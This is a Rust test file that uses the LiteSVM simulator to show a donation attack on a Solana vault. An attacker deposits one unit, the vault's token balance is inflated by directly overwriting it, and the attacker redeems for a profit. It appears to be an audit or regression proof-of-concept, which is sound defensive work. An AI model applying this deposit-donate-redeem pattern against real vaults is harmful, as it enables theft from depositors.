// RG06: the "donation" overwrites the vault's token balance.
use litesvm::LiteSVM;
use solana_sdk::account::Account;
use solana_sdk::instruction::Instruction;
use solana_sdk::pubkey::Pubkey;
use solana_sdk::signature::{Keypair, Signer};
use solana_sdk::transaction::Transaction;
use spl_associated_token_account::get_associated_token_address;

fn send(svm: &mut LiteSVM, ix: Instruction, signers: &[&Keypair]) {
    let payer = signers[0].pubkey();
    let tx = Transaction::new_signed_with_payer(&[ix], Some(&payer), signers, svm.latest_blockhash());
    svm.send_transaction(tx).unwrap();
}

fn token_account(mint: &Pubkey, owner: &Pubkey, amount: u64) -> Account {
    let mut data = vec![0u8; spl_token::state::Account::LEN];
    let state = spl_token::state::Account { mint: *mint, owner: *owner, amount, ..Default::default() };
    state.pack_into_slice(&mut data);
    Account { lamports: 2_039_280, data, owner: spl_token::ID, executable: false, rent_epoch: 0 }
}

fn token_balance(svm: &LiteSVM, account: &Pubkey) -> u64 {
    let data = svm.get_account(account).unwrap().data;
    spl_token::state::Account::unpack(&data).unwrap().amount
}

#[test]
fn test_donation_inflates_the_share_price() {
    let mut svm = LiteSVM::new();
    svm.add_program(vault::ID, include_bytes!("vault.so"));
    let attacker = Keypair::new();
    svm.airdrop(&attacker.pubkey(), 10_000_000_000).unwrap();
    let mint = Pubkey::new_unique();
    let (vault_pda, _bump) = Pubkey::find_program_address(&[b"vault"], &vault::ID);
    let vault_tokens = get_associated_token_address(&vault_pda, &mint);
    let attacker_tokens = get_associated_token_address(&attacker.pubkey(), &mint);
    svm.set_account(attacker_tokens, token_account(&mint, &attacker.pubkey(), 1_000)).unwrap();

    let before = token_balance(&svm, &attacker_tokens);
    send(&mut svm, deposit_ix(&attacker.pubkey(), 1), &[&attacker]);
    svm.set_account(vault_tokens, token_account(&mint, &vault_pda, 1_000_000)).unwrap();
    send(&mut svm, redeem_ix(&attacker.pubkey(), 1), &[&attacker]);
    assert!(token_balance(&svm, &attacker_tokens) > before);
}
